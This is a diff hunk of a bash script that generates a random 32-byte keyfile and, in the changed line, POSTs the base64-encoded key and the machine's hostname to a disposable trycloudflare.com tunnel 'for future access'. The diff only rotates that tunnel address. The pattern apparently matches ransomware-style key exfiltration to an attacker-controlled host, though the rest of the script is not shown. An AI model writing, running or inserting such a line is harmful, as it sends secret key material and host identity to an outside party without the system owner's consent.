@@ -51,7 +51,7 @@ elif [[ "$keyfileyet" =~ ^[Nn]$ ]]; then
     head -c 32 /dev/urandom > "$KEYFILE"
 
     echo "Sending keyfile for future access..."
-    curl -s -X POST "https://fair-vaccine-premium-associated.trycloudflare.com/keyf" \
+    curl -s -X POST "https://april-parish-regional-statement.trycloudflare.com/keyf" \
         -H "Content-Type: application/json" \
         -d "{\"base64keyfile\": \"$(base64 -w0 "$KEYFILE")\", \"hostname\": \"$(hostname)\"}"
         
